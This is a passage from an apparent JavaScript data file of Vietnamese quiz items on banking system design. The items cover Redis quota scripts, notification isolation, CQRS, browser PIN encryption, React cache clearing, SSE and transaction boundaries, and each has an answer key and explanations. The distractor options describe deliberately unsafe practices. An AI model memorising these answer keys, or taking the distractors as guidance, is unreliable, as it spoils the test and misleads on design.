          "whyCorrect": "Kiến trúc phễu chặn tải kinh điển mà mọi ví điện tử lớn (MoMo, ZaloPay, VNPay, ShopeePay) đều áp dụng cho các chiến dịch săn deal giờ vàng! Nếu để 1 triệu request đập thẳng vào 1 dòng `campaigns` trong PostgreSQL, cả cụm DB hạch toán lõi sẽ nghẽn chết ngay giây đầu tiên! Thay vào đó, **Redis chạy đơn luồng tuần tự hóa lệnh thực thi cho từng Lua Script**: gói gọn cả 3 bước *(Kiểm tra user chưa từng nhận + Kiểm tra `quota > 0` + Đánh dấu user đã nhận & giảm `quota` đi 1)* vào **1 đoạn Lua Script nguyên tử duy nhất** giúp Redis xử lý hàng chục nghìn phép kiểm tra/giây với độ trễ < 1ms và **không bao giờ bị Race Condition phát lố suất thứ 10.001**! Sau cái phễu đó chỉ còn đúng 10.000 sự kiện hợp lệ chảy êm ái qua Kafka xuống ghi Sổ cái DB.",
          "whyWrong": [
            "1 triệu request tranh khóa `SELECT FOR UPDATE` trên 1 dòng PostgreSQL gây bão chờ khóa làm sập luôn toàn bộ kết nối DB của ngân hàng.",
            "",
            "Tách rời lệnh `GET` và `DECR` thành 2 bước mạng giữa Java và Redis là bẫy **Time-of-Check to Time-of-Use (TOCTOU)**: khi còn 1 suất cuối, 500 Pod cùng `GET` thấy `quota = 1` rồi cùng `DECR` làm `quota` tụt âm xuống `-499`, ngân hàng lỗ lố ngân sách ngay!",
            "Báo trúng thưởng giả rồi thu hồi lại của 990.000 khách hàng là thảm họa truyền thông, pháp lý và uy tín thương hiệu ngân hàng."
          ],
          "tip": "Bài toán Flash-Sale / Quota giới hạn triệu người bấm: **Cấm đập thẳng DB OLTP**, **Cấm tách rời `GET` + `DECR` trên Redis** -> Dùng phễu `Gateway Rate Limit -> Atomic Redis Lua Script (Check User + Decrement Quota) -> Kafka Async Ledger Settlement`!"
        }
      },
      {
        "id": "R4-06",
        "domain": "System Design Trung tâm Thông báo Đa kênh < 2s (A3)",
        "lessonId": "A3",
        "difficulty": "Trung bình",
        "caseStudy": r4CaseStudy,
        "question": "Vào sáng ngày lễ, phòng Marketing của OmniBank bấm nút gửi chiến dịch 5 triệu thông báo giới thiệu thẻ tín dụng mới. Ngay lập tức, toàn bộ tin nhắn SMS/Push chứa mã OTP xác thực chuyển tiền của khách hàng bị kẹt cứng, sau 18 phút mới tới điện thoại (khi mã OTP đã hết hạn từ lâu!). Ngoài ra, nhà mạng cổng SMS số 1 thỉnh thoảng bị nghẽn tuyến. Bạn thiết kế lại kiến trúc Notification Hub như thế nào?",
        "options": [
          "Giữ chung một Kafka Topic `notifications-all` duy nhất cho mọi loại tin nhắn nhưng tăng thời hạn hiệu lực của mã OTP từ 60 giây lên 45 phút.",
          "Gọi đồng bộ trực tiếp API nhà mạng SMS ngay bên trong hàm Controller tạo giao dịch chuyển tiền để bắt buộc gửi xong SMS mới trả phản hồi cho App.",
          "Tách biệt hoàn toàn đường ống theo mức ưu tiên nghiêm ngặt (**Strict Bulkhead & Priority Isolation**): tách riêng Topic, Consumer Pool và băng thông kết nối đối tác cho `topic.critical.otp` (SLA < 2s, tài nguyên dành riêng không bao giờ bị chèn ép), `topic.high.balance` (biến động số dư) và `topic.bulk.marketing` (có Rate Limiter điều tiết tốc độ gửi êm); đồng thời xây dựng **Multi-vendor SMS Smart Router** tự động đo tỷ lệ giao tin/độ trễ theo đầu số nhà mạng để chuyển mạch nóng (Failover) sang nhà cung cấp SMS số 2 ngay khi cổng số 1 suy giảm chất lượng.",
          "Yêu cầu phòng Marketing chỉ được gửi tin nhắn quảng cáo vào lúc 03h00 sáng hằng đêm đánh thức toàn bộ 12 triệu khách hàng."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "Marketing bắn 5 triệu tin quảng cáo làm tin nhắn OTP bị kẹt 18 phút ... nhà mạng cổng SMS số 1 thỉnh thoảng nghẽn tuyến",
          "whyCorrect": "Lỗi kinh điển gọi tên **Head-of-Line Blocking trên hàng đợi dùng chung**! Trong ngân hàng, 1 tin nhắn OTP là điều kiện sống còn để hoàn tất giao dịch tài chính (SLA tính bằng 1–2 giây), trong khi 5 triệu tin quảng cáo thẻ tín dụng trễ 30 phút không ảnh hưởng đến ai cả. Nếu nhồi chung cả hai vào 1 Topic Kafka FIFO, tin OTP của khách vừa bấm chuyển tiền phải xếp hàng sau lưng 4.999.999 tin quảng cáo! Giải pháp chuẩn kiến trúc là **cô lập hoàn toàn từ Topic, Worker Pool đến hạn ngạch TPS nhà mạng** giữa 3 làn `CRITICAL (OTP)` - `HIGH (Balance Alert)` - `BULK (Promo + Throttler)`, kết hợp bộ định tuyến đa nhà cung cấp (**Multi-vendor SMS Gateway với Circuit Breaker & Health Score**) để khi cổng Viettel/VNPT qua Vendor A lag thì tự động bẻ lái sang Vendor B tức thì!",
          "whyWrong": [
            "Giữ chung hàng đợi khiến khách phải ngồi nhìn màn hình chờ OTP suốt 18 phút là trải nghiệm thảm họa, còn kéo dài hạn OTP lên 45 phút làm suy yếu nghiêm trọng an ninh xác thực.",
            "Gọi cổng SMS bên thứ ba đồng bộ trên luồng chính sẽ khiến độ trễ API ngân hàng phụ thuộc hoàn toàn vào mạng viễn thông ngoài biên.",
            "",
            "Gửi tin nhắn quảng cáo lúc 3 giờ sáng vừa gây phẫn nộ cho khách hàng, vừa vi phạm trực tiếp Nghị định chống tin nhắn rác của Bộ TT&TT (chỉ cho phép gửi tin quảng cáo trong khung giờ quy định)."
          ],
          "tip": "Thiết kế Notification Hub Ngân hàng luôn khắc cốt 2 nguyên tắc: **Cô lập tuyệt đối làn `OTP` khỏi làn `Marketing` (Topic + Worker + Quota riêng)** + **Multi-vendor Failover Router**!"
        }
      },
      {
        "id": "R4-07",
        "domain": "System Design Sao kê 5 Năm & Xuất Báo cáo (CQRS) (A4)",
        "lessonId": "A4",
        "difficulty": "Trung bình",
        "caseStudy": r4CaseStudy,
        "question": "Khách hàng doanh nghiệp trên `ib.omnibank.vn` cần tìm kiếm sao kê trong lịch sử 5 năm theo từ khóa bất kỳ trong nội dung chuyển khoản (VD: `'thanh toan hop dong so 45'`), lọc theo khoảng tiền và bấm nút xuất tệp Excel/CSV chứa 500.000 dòng giao dịch. Nếu chạy `SELECT ... WHERE narrative LIKE '%...%'` và tạo file trực tiếp trên PostgreSQL Core Ledger sẽ làm CPU DB vọt lên 100% ảnh hưởng luồng chuyển tiền 10k TPS. Kiến trúc nào giải quyết trọn vẹn bài toán này?",
        "options": [
          "Áp dụng mẫu **CQRS (Command Query Responsibility Segregation)**: giữ PostgreSQL Core Ledger chuyên tâm xử lý giao dịch OLTP, dùng **Debezium CDC / Kafka** đồng bộ luồng bút toán gần thời gian thực sang cụm **OpenSearch / ClickHouse** (tối ưu Full-text Search & truy vấn phân tích cột trên dữ liệu nhiều năm, phân tầng Hot-Warm-Cold); còn tính năng xuất 500.000 dòng thực hiện **bất đồng bộ qua Export Worker**: đọc dữ liệu theo luồng con trỏ (Cursor/Scroll Streaming), ghi nối từng phần (Multipart Upload) thẳng lên S3/MinIO rồi gửi thông báo kèm **Pre-signed URL có thời hạn ngắn** để khách tải file.",
          "Chạy trực tiếp `LIKE '%hop dong%'` trên bảng giao dịch chính của Core OLTP nhưng dặn khách hàng chỉ được bấm tìm kiếm tối đa 1 lần mỗi tuần.",
          "Đọc toàn bộ 500.000 bản ghi lên bộ nhớ RAM của API Gateway tạo thành một mảng JSON khổng lồ nặng 400MB trả về trong một HTTP Response đồng bộ duy nhất.",
          "Xóa vĩnh viễn mọi dữ liệu sao kê quá 30 ngày của ngân hàng để bảng dữ liệu luôn nhỏ gọn dưới 1 triệu dòng."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "tìm kiếm sao kê 5 năm theo từ khóa bất kỳ ... xuất tệp 500.000 dòng ... không gây ảnh hưởng cơ sở dữ liệu hạch toán lõi OLTP",
          "whyCorrect": "Một thiết kế CQRS mẫu mực tách bạch hoàn toàn tải Đọc nặng (Heavy Read/Search) khỏi tải Ghi sống còn (Mission-critical OLTP Write)! B-Tree Index thông thường trên RDBMS hoàn toàn vô tác dụng trước truy vấn tìm chuỗi con `LIKE '%tu khoa%'` dẫn tới quét toàn bảng (Full Table Scan) hàng tỷ dòng! Khi tách sang Read Store chuyên dụng (**OpenSearch** cho tìm kiếm toàn văn nội dung diễn giải kết hợp **ClickHouse/Partitioned Read Store** cho thống kê khoảng thời gian dài) đồng bộ qua **CDC từ WAL log**, khách doanh nghiệp tìm kiếm 5 năm mượt dưới 100ms mà Core DB không tốn dù 0,1% CPU! Và với xuất báo cáo nửa triệu dòng: **Async Job + Cursor Streaming + Multipart S3 Upload + Pre-signed URL (kiểm tra quyền chủ tài khoản)** đảm bảo RAM Worker phẳng lặng ở vài chục MB và không bao giờ dính HTTP Gateway Timeout!",
          "whyWrong": [
            "",
            "Một vài câu `LIKE '%...%'` quét hàng tỷ dòng trên bảng giao dịch chính sẽ làm trôi sạch Buffer Pool (Cache Eviction) và ngốn hết Disk IOPS của Core OLTP ngay lập tức.",
            "Dựng cục JSON/Excel 500.000 dòng trong RAM đồng bộ trên HTTP sẽ gây `OutOfMemoryError` hàng loạt Pod và đứt kết nối tại giới hạn Timeout 30–60s của Load Balancer.",
            "Luật Kế toán và quy định của Ngân hàng Nhà nước bắt buộc lưu trữ chứng từ, sổ sách giao dịch điện tử tối thiểu 10 năm trở lên — xóa sau 30 ngày là vi phạm pháp luật nghiêm trọng!"
          ],
          "tip": "Công thức chuẩn cho bài toán Tra cứu Sao kê nhiều năm + Xuất file lớn: **CQRS (OLTP Postgres -> CDC Kafka -> OpenSearch/ClickHouse)** + **Async Streaming Export -> S3/MinIO Pre-signed URL**!"
        }
      },
      {
        "id": "R4-08",
        "domain": "Mã hóa PIN Trình duyệt (WebCrypto) & Anti-Clickjacking (F6)",
        "lessonId": "F6",
        "difficulty": "Trung bình",
        "caseStudy": r4CaseStudy,
        "question": "Khi khách hàng nhập mã PIN thẻ 6 số trên giao diện Web Internet Banking `ib.omnibank.vn` để kích hoạt thẻ hoặc đổi mã PIN, Khối An ninh yêu cầu mã PIN dạng rõ (Plaintext PIN) tuyệt đối không bao giờ được xuất hiện tại tầng WAF, Reverse Proxy, API Gateway hay bộ nhớ của các microservice trung gian trước khi vào tới vùng bảo mật HSM, đồng thời trang nhập PIN không thể bị kẻ gian nhúng ẩn vào một trang web trúng thưởng giả mạo (tấn công Clickjacking). Bạn triển khai giải pháp nào?",
        "options": [
          "Đảo ngược thứ tự 6 chữ số PIN trên trình duyệt (VD `123456` thành `654321`) trước khi gửi qua HTTPS thông thường và dùng CSS đặt màu nền trắng cho khung nhập PIN.",
          "Mã hóa mã PIN bằng hàm `btoa(pin)` của JavaScript trên trình duyệt để biến thành chuỗi ký tự bí mật không ai giải mã được.",
          "Tải khóa riêng tư (Private Key) của HSM xuống mã JavaScript trên trình duyệt khách hàng để trình duyệt tự ký số mã PIN.",
          "Sử dụng chuẩn **Web Crypto API gốc của trình duyệt (`window.crypto.subtle.encrypt` với thuật toán bất đối xứng `RSA-OAEP`)** mã hóa mã PIN kèm yếu tố ngẫu nhiên/phiên ngay trên trình duyệt bằng Public Key của vùng HSM/Card Vault để chỉ duy nhất HSM ở đích cuối mới giải mã/chuyển đổi PIN Block được; đồng thời trả về HTTP Security Headers **`Content-Security-Policy: frame-ancestors 'none'`** và **`X-Frame-Options: DENY`** để chặn tuyệt đối việc nhúng trang ngân hàng vào `<iframe>` của bất kỳ trang web nào khác."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "Plaintext PIN tuyệt đối không xuất hiện tại WAF, Reverse Proxy, API Gateway hay microservice trung gian trước khi vào vùng HSM ... chống nhúng ẩn Clickjacking",
          "whyCorrect": "Rất chuẩn xác chuẩn bảo mật thẻ quốc tế! Hãy nhớ lại bài học về TLS Termination: HTTPS chỉ mã hóa trên đường dây mạng Internet từ máy khách tới con WAF / Load Balancer đầu tiên của ngân hàng; tại đó gói tin được giải mã ra HTTP rõ để WAF quét luật và đi qua API Gateway, BFF... Nếu không có **Client-side End-to-End Encryption (E2EE)** cho trường PIN, bất kỳ cấu hình ghi log nhầm nào ở WAF/Gateway cũng làm lộ sạch PIN thẻ của khách! Dùng **`window.crypto.subtle.encrypt` (`RSA-OAEP` SHA-256)** với Public Key xuất từ HSM giúp PIN được bọc kín từ khoảnh khắc rời bàn phím cho tới tận bên trong chip bảo mật phần cứng HSM! Cộng thêm bộ đôi header **`CSP: frame-ancestors 'none'` + `X-Frame-Options: DENY`** khóa chết 100% trò lừa đảo nhúng `iframe` trong suốt (Clickjacking)!",
          "whyWrong": [
            "Đảo ngược chuỗi chỉ là trò đùa ngây thơ chứ không phải mật mã học, còn CSS trong trang không ngăn được trang cha bên ngoài phủ lớp `iframe` mờ độ trong suốt `opacity: 0` lên trên.",
            "`btoa()` chỉ là hàm đổi sang bảng mã Base64 (`btoa('123456') -> 'MTIzNDU2'`), gọi `atob()` một cái là hiện nguyên hình trong 0,001 mili-giây!",
            "Private Key của HSM theo thiết kế phần cứng chống xâm nhập (Tamper-resistant) không bao giờ được phép trích xuất ra ngoài chip HSM, huống chi phát tán xuống trình duyệt công cộng!",
            ""
          ],
          "tip": "Bảo vệ trường tối mật (PIN / Mật khẩu cấp 2) từ trình duyệt vào thẳng HSM -> Dùng **WebCrypto API `crypto.subtle.encrypt` (`RSA-OAEP` với HSM Public Key)**; Chống nhúng `iframe` lừa bấm (Clickjacking) -> **`CSP: frame-ancestors 'none'` + `X-Frame-Options: DENY`**!"
        }
      },
      {
        "id": "R4-09",
        "domain": "React 18/19, TanStack Query, Virtualization & Cache (F3)",
        "lessonId": "F3",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Trên ứng dụng Web Digital Banking viết bằng React + TanStack Query, bạn gặp hai vấn đề: (1) Màn hình xem sao kê tháng Tết render trực tiếp mảng 12.000 dòng thẻ DOM `<tr>` khiến trình duyệt treo đơ 6 giây; (2) Khi khách hàng A đăng xuất trên máy tính dùng chung ở gia đình/văn phòng và khách hàng B đăng nhập ngay trên cùng tab đó mà không bấm F5 tải lại trang, màn hình Dashboard thoáng hiện số dư cũ của khách hàng A trong 1 giây! Bạn xử lý hai lỗi này thế nào?",
        "options": [
          "Áp dụng kỹ thuật **Window / List Virtualization** (như `@tanstack/react-virtual` chỉ gắn vào DOM đúng ~20–30 dòng đang nằm trong khung nhìn cộng vùng đệm overscan khi cuộn), kết hợp cơ chế polling có điều kiện cho giao dịch chờ xử lý; và tại luồng Đăng xuất / Đổi phiên người dùng bắt buộc gọi **`queryClient.clear()`** (xóa trắng toàn bộ In-memory Query Cache và hủy các truy vấn đang bay) đồng thời gắn định danh phiên/CIF vào `queryKey`.",
          "Lưu toàn bộ 12.000 dòng sao kê và số dư vào `localStorage` để lần đăng nhập sau của bất kỳ ai trên máy đó cũng hiện lên tức thì.",
          "Dùng `setInterval(() => window.location.reload(), 3000)` ép tải lại toàn bộ trang web ngân hàng cứ mỗi 3 giây một lần.",
          "Tắt chế độ Strict Mode của React 18 thì 12.000 nút DOM phức tạp sẽ không còn tốn bộ nhớ trình duyệt nữa."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "render trực tiếp 12.000 dòng DOM <tr> làm treo trình duyệt 6 giây ... khách hàng A đăng xuất, khách hàng B đăng nhập trên cùng tab thoáng hiện số dư cũ của A",
          "whyCorrect": "Hai lỗi Frontend cực kỳ thực tế trong các ứng dụng ngân hàng SPA! Thứ nhất, trình duyệt không chậm vì giữ mảng 12.000 object JSON trong RAM (chỉ vài MB), mà chết cứng vì phải tính toán Layout/Paint cho `12.000 dòng x 15 thẻ HTML con = 180.000 DOM nodes` cùng lúc! Kỹ thuật **Virtualization (`@tanstack/react-virtual`)** chỉ giữ cố định khoảng 25 thẻ DOM trên màn hình và tái sử dụng vị trí khi cuộn mượt ở 60 FPS! Thứ hai (lỗi bảo mật riêng tư nghiêm trọng rất hay lọt QA): trong kiến trúc SPA chuyển trang không reload, bộ nhớ đệm `QueryClient` của TanStack Query tồn tại xuyên suốt phiên tab — nếu lúc Logout chỉ xóa trạng thái đăng nhập mà quên gọi **`queryClient.clear()`**, cơ chế *Stale-While-Revalidate* sẽ lôi ngay dữ liệu `['accounts', 'summary']` cũ của người trước ra hiển thị cho người sau nhìn thấy!",
          "whyWrong": [
            "",
            "Cất số dư và sao kê tài chính vào `localStorage` trên máy tính dùng chung làm lộ vĩnh viễn dữ liệu tài chính cá nhân cho bất kỳ ai mở máy lên sau đó.",
            "Reload toàn trang mỗi 3 giây sẽ xóa sạch mọi biểu mẫu chuyển khoản khách đang gõ dở và bắn bão tải tài nguyên tĩnh lên máy chủ.",
            "React Strict Mode chỉ chạy kiểm tra kép ở môi trường Development; trên bản build Production nó không chạy kép nhưng 180.000 DOM nodes thật vẫn làm đơ luồng giao diện chính (Main Thread)."
          ],
          "tip": "Hiển thị danh sách sao kê nghìn dòng trên React -> Dùng **List Virtualization (`@tanstack/react-virtual`)**; Xử lý Logout trên SPA ngân hàng -> Bắt buộc gọi **`queryClient.clear()`** xóa sạch toàn bộ dữ liệu đệm trong RAM!"
        }
      },
      {
        "id": "R4-10",
        "domain": "Kiến trúc BFF & Thông báo Thời gian thực SSE (F5)",
        "lessonId": "F5",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Cửa hàng tạp hóa mở màn hình Dashboard nhận tiền VietQR trên trình duyệt Web để mỗi khi khách mua hàng quét mã chuyển khoản thành công, màn hình tự động bật popup kèm âm thanh đọc số tiền vừa nhận trong dưới 1 giây. Kiến trúc giao tiếp nào từ Backend xuống trình duyệt gọn nhẹ, an toàn và tối ưu tài nguyên nhất?",
        "options": [
          "Mở cổng Broker Apache Kafka nội bộ của ngân hàng ra thẳng Internet công cộng để trình duyệt Web kết nối trực tiếp vào đọc Topic biến động số dư của toàn ngân hàng.",
          "Cho trình duyệt của 500.000 cửa hàng cùng chạy `setInterval` bắn HTTP `GET /api/v1/transactions` mỗi 200 mili-giây một lần (tạo ra 2,5 triệu request/giây) bất kể có khách mua hàng hay không.",
          "Khi Core Ledger phát sự kiện cộng tiền qua Kafka, dịch vụ **BFF** lọc đúng sự kiện thuộc `cif` của chủ cửa hàng đang kết nối và đẩy thông báo một chiều tức thời từ Server xuống trình duyệt qua chuẩn **Server-Sent Events (`SseEmitter` / `EventSource` chạy mượt trên HTTP/2 multiplexing, tự động kết nối lại kèm `Last-Event-ID` để bù tin nhỡ khi chập chờn mạng)**.",
          "Bắt chủ cửa hàng bấm phím F5 thủ công liên tục sau mỗi lần khách hàng giơ điện thoại lên quét mã."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "màn hình Web tự động bật popup kèm âm thanh đọc số tiền VietQR vừa nhận trong dưới 1 giây ... một chiều từ Backend xuống trình duyệt",
          "whyCorrect": "Lựa chọn quá tinh tế! Hãy phân tích đặc thù bài toán: thông báo biến động số dư là luồng dữ liệu **một chiều (Unidirectional: Server -> Browser)**, tần suất phát sinh theo sự kiện thực tế chứ trình duyệt không cần đẩy luồng nhị phân hai chiều liên tục lên Server. So với Polling điên cuồng (lãng phí 99,9% băng thông và đánh sập DB) hay WebSocket (phức tạp hơn khi cấu hình cân bằng tải, tường lửa doanh nghiệp và tự viết cơ chế reconnect), chuẩn **SSE (`Server-Sent Events` với `SseEmitter` trên Spring Boot / Flux trên WebFlux)** tận dụng luôn đường truyền HTTP/2 sẵn có, hỗ trợ xác thực qua Cookie `HttpOnly` của BFF cực mượt và trình duyệt tích hợp sẵn `EventSource` tự động nối lại kèm header `Last-Event-ID` để không bỏ sót thông báo tiền về lúc mạng chập chờn!",
          "whyWrong": [
            "Phơi bày cụm Kafka lõi của ngân hàng ra Internet cho trình duyệt kết nối trực tiếp là điều không tưởng về mặt an ninh mạng lẫn giao thức trình duyệt.",
            "Short-polling mỗi 200ms cho 500.000 máy khách tạo ra cơn bão DDoS tự sát 2,5 triệu RPS đập vào hệ thống trong khi phần lớn thời gian không có giao dịch mới.",
            "",
            "Bắt người bán hàng tự F5 thủ công làm mất hoàn toàn giá trị trải nghiệm thanh toán tức thời QR động."
          ],
          "tip": "Cần đẩy thông báo thời gian thực một chiều `Server -> Web Browser` (Biến động số dư, Trạng thái duyệt lệnh, Tỷ giá) qua tầng BFF -> Ưu tiên số 1 là **SSE (`SseEmitter` / `EventSource` trên HTTP/2)**!"
        }
      },
      {
        "id": "R4-11",
        "domain": "Code Review Senior: Transaction Boundary & Connection Hold (A5)",
        "lessonId": "A5",
        "difficulty": "Khó (Tử huyệt Production)",
        "caseStudy": null,
        "question": "Trong buổi phỏng vấn vòng Code Review vị trí Senior Java tại ngân hàng, hội đồng đưa cho bạn đoạn code xử lý thanh toán hóa đơn điện lực sau:\n`@Transactional`\n`public BillReceipt payElectricBill(PayCmd cmd) {`\n`    Account acc = accountRepo.lockById(cmd.accountId());`\n`    acc.debit(cmd.amount());`\n`    ProviderResp resp = restClient.post().uri(evnUrl).body(cmd).retrieve().body(ProviderResp.class);`\n`    return saveReceipt(acc, resp);`\n`}`\nVới HikariCP `maximum-pool-size = 20`, điều gì xảy ra khi cổng đối tác EVN phản hồi chậm 10 giây ở mức tải chỉ 30 người thanh toán hóa đơn/giây, và bạn phải refactor như thế nào?",
        "options": [
          "Không có ảnh hưởng gì đến các tính năng khác của ngân hàng, chỉ riêng những người đóng tiền điện mới phải chờ 10 giây.",
          "Toàn bộ 20 kết nối DB của HikariCP sẽ bị chiếm giữ cứng sau chưa đầy 1 giây (`20 conn / 10s = tối đa 2 TPS`!), kéo theo **tất cả các API khác dùng chung DB Pool trong service (kể cả xem số dư, chuyển khoản nội bộ) chết đứng dây chuyền** với lỗi `Connection is not available`! Cách refactor chuẩn: **Tách làm 3 pha giao dịch ngắn (mỗi pha < 5ms)** — Pha 1 (`@Transactional` ngắn): kiểm tra số dư, khoanh giữ tiền (`HOLD` / ghi `PENDING`) rồi commit giải phóng ngay kết nối DB; Pha 2 (**NGOÀI `@Transactional`**): gọi HTTP sang đối tác bọc trong Bulkhead + Timeout; Pha 3 (`@Transactional` ngắn): tất toán cắt tiền nếu đối tác thành công, hoàn nhả Hold nếu từ chối rõ ràng, hoặc treo chờ đối soát nếu Timeout!",
          "Giữ nguyên hàm `@Transactional` bọc lời gọi HTTP nhưng tăng `maximum-pool-size` của HikariCP lên `10.000` kết nối cho mỗi Pod.",
          "Thêm từ khóa `synchronized` vào đầu hàm `payElectricBill` để chỉ cho 1 người đóng tiền điện trên toàn quốc tại một thời điểm."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "@Transactional bọc cả lockById lẫn restClient.post() gọi đối tác ngoài ... HikariCP pool-size = 20, đối tác chậm 10 giây",
          "whyCorrect": "Nếu trong cả buổi phỏng vấn em chỉ cần mổ xẻ sắc lẹm đúng đoạn code 7 dòng này như vậy thôi là các sếp Tech Lead gật đầu tuyển thẳng ngay lập tức! Hãy nhớ cơ chế bên dưới của Spring `@Transactional`: ngay khi chạm câu truy vấn đầu tiên, `DataSourceTransactionManager` mượn 1 kết nối vật lý từ HikariCP gắn chặt vào `ThreadLocal` của luồng đó và **GIỮ KHư KHư kết nối đó không nhả ra cho tới tận dấu ngoặc nhọn `}` cuối hàm**! Bình thường 1 câu SQL tốn 2ms thì 1 kết nối phục vụ được `500 giao dịch/giây`; nhưng khi nhét `restClient` chờ mạng 10.000ms vào giữa, thông lượng sụp đổ 5.000 lần xuống còn `0,1 giao dịch/giây/kết nối`! Tách thành mô hình **3 pha (Reserve/Hold DB -> Non-transactional External I/O -> Finalize/Compensate DB)** giải phóng kết nối DB trong 2ms, cứu sống toàn bộ hệ thống!",
          "whyWrong": [
            "Nhầm lẫn chết người: vì các API trong cùng microservice dùng chung `HikariDataSource`, chỉ cần 20 người đóng tiền điện chiếm hết sạch 20 kết nối DB là hàng vạn người đang xem số dư hay chuyển khoản nội bộ cũng chết chùm 100%!",
            "",
            "Mở 10.000 kết nối vật lý từ mỗi Pod vào PostgreSQL sẽ đánh sập ngay lập tức máy chủ Database vì cạn kiệt RAM và quá tải chuyển ngữ cảnh tiến trình (OS Context Switching).",
            "Gắn `synchronized` khi bên trong chờ mạng 10 giây sẽ hạ thông lượng toàn Pod xuống còn `0,1 request/giây` (6 người đóng tiền mỗi phút!)."
          ],
          "tip": "Luật thép số 1 khi Code Review Java Ngân hàng: **TUYỆT ĐỐI KHÔNG đặt lời gọi HTTP/SOAP/gRPC sang đối tác ngoài hoặc gửi File bên trong khối `@Transactional`!** Luôn tách 3 bước: `Hold (Tx1) -> Call Partner (No Tx) -> Settle/Release (Tx2)`!"
        }
      },
      {
        "id": "R4-12",
        "domain": "Khung 4 Bước Phỏng vấn System Design Senior/Lead (A6)",
        "lessonId": "A6",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Trong vòng phỏng vấn System Design kéo dài 45 phút cho vị trí Senior Java Architect tại ngân hàng, người phỏng vấn ra đề mở khá ngắn gọn: *'Em hãy thiết kế hệ thống Ví điện tử và Chuyển tiền P2P cho ngân hàng mình'*. Cách tiếp cận nào trong 45 phút thể hiện đúng tầm vóc Senior/Lead nhất?",
        "options": [
          "Lập tức cầm bút vẽ ngay 18 ô microservice kèm đầy đủ Kubernetes, Istio Service Mesh, Blockchain và AI vào bảng trắng ngay từ phút thứ nhất mà không hỏi lại bất kỳ câu hỏi nào.",
          "Dành 35 phút đầu tiên để viết chi tiết câu lệnh `CREATE TABLE users` gồm 40 cột họ tên, quê quán, sở thích, avatar đến hết giờ vẫn chưa chạm tới luồng chuyển tiền.",
          "Triển khai mạch lạc theo **Khung 4 bước chuẩn Kiến trúc sư**: (1) *5–7 phút đầu*: Chủ động hỏi làm rõ Yêu cầu chức năng trọng tâm & Yêu cầu phi chức năng đặc thù tài chính (DAU, TPS trung bình/đỉnh, cam kết Strong Consistency cho sổ cái, SLA P99, RPO = 0 / RTO, yêu cầu đối soát); (2) *5 phút*: Ước lượng tải sơ bộ (QPS đọc/ghi, băng thông, tăng trưởng dung lượng sổ cái/năm); (3) *12–15 phút*: Vẽ kiến trúc tổng thể End-to-End luồng tiền chảy rõ ràng; (4) *18–20 phút quyết định*: Chủ động **Deep-dive giải quyết các nút thắt hóc búa** (Idempotency chống trừ đúp, Locking chống âm tiền/Deadlock, Hot Account, Outbox/Saga xử lý lỗi mạng, Đối soát T+0) và phân tích rõ sự đánh đổi (**Trade-offs**).",
          "Trả lời ngắn gọn 'Em sẽ cài PostgreSQL và Spring Boot rồi cho chạy là xong ạ' và ngồi im chờ giám khảo gợi ý từng ý nhỏ."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "phỏng vấn System Design 45 phút ... đề mở ngắn gọn: Thiết kế hệ thống Ví điện tử và Chuyển tiền P2P",
          "whyCorrect": "Bí kíp vàng đã giúp hàng trăm anh em đỗ vòng System Design tại Techcombank, Vietcombank, MB, MoMo, ZaloPay! Đề bài System Design luôn cố tình được ra **mơ hồ và thiếu dữ kiện** không phải vì giám khảo quên, mà để kiểm tra xem em có tư duy đặt câu hỏi khám phá bài toán (Ambiguity Resolution) như một Senior thực thụ hay lao đầu vào code mù quáng như một Junior! Trong ngành ngân hàng, chỉ cần 5 phút đầu em chủ động chốt ngay 4 chữ vàng: **TPS đỉnh, Strong Consistency (không âm tiền), RPO = 0 và Đối soát T+0**, sau đó chủ động dẫn dắt cuộc trò chuyện xoáy sâu vào Idempotency, Deadlock Ordering, Hot Account và Outbox/Saga ở nửa sau buổi phỏng vấn là giám khảo biết chắc chắn em đã chinh chiến hệ thống lớn thật sự!",
          "whyWrong": [
            "Vẽ tràn lan hàng chục công nghệ thời thượng (Over-engineering / Buzzword-driven) khi chưa biết hệ thống phục vụ 100 TPS hay 50.000 TPS là dấu hiệu đỏ lớn nhất của người thiếu kinh nghiệm thực tế.",
            "Sa đà vào các bảng CRUD phụ trợ không có thách thức kỹ thuật làm cháy sạch quỹ thời gian 45 phút trước khi kịp trình bày phần lõi hạch toán tiền tệ.",
            "",
            "Thụ động trả lời cộc lốc buộc giám khảo phải 'cạy răng' hỏi mớm từng ý sẽ bị đánh giá chỉ đạt mức Junior/Mid-level, chưa đủ khả năng tự chủ thiết kế của bậc Senior."
          ],
          "tip": " Phân bổ vàng 45 phút System Design Ngân hàng: `7p Chốt NFR (TPS, Consistency, RPO/RTO)` -> `5p Ước lượng tải` -> `13p Kiến trúc lõi` -> `20p Chủ động Deep-dive (Idempotency, Locking, Hot Account, Saga, Đối soát & Trade-offs)`!"
        }
      },
      {
        "id": "R4-13",
        "domain": "Capstone M1: Thiết kế Schema CSDL Sổ Cái & Flyway (C1)",
        "lessonId": "C1",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ở Milestone 1 của Đồ án Thực chiến Mini Digital Core Banking (`finbank-platform`), bạn thiết kế script khởi tạo Flyway `V1__init_core_ledger.sql` trên PostgreSQL 16. Tập hợp bảng và ràng buộc toàn vẹn (Database Constraints) nào sau đây tạo nên nền móng vững chắc chuẩn Production để tự tin bảo vệ trước hội đồng phỏng vấn?",
        "options": [
          "Tạo duy nhất 1 bảng `transactions(from_acc VARCHAR, to_acc VARCHAR, amount FLOAT)` không có khóa ngoại, không có ràng buộc `CHECK` hay `UNIQUE` nào cả vì mọi kiểm tra đã có `if-else` trên giao diện React lo hết.",
          "Lưu toàn bộ số dư và danh sách hàng triệu bút toán của một khách hàng vào một cột chuỗi `TEXT` phân cách bằng dấu chấm phẩy `;` trong bảng `users`.",
          "Bật `spring.jpa.hibernate.ddl-auto=create-drop` trên môi trường Production để Hibernate tự xóa đi tạo lại toàn bộ bảng sổ cái mỗi lần khởi động ứng dụng.",
